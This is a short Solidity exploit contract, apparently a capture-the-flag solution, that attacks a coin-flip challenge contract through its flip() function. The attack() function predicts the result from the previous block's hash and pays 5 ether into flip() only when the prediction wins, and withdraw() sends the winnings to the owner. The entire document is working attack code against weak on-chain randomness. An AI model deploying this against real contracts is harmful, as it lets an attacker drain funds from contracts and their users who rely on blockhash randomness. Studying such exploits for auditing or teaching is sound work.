// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IChal {
    function flip() external payable;
}

contract Attack {
    IChal public immutable target;
    address public owner;

    constructor(address _target) {
        target = IChal(_target);
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() public {
        if (uint256(blockhash(block.number - 1)) % 2 == 0) {
            require(address(this).balance >= 5 ether, "Not enough ETH to attack");
            target.flip{value: 5 ether}();
        }
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}
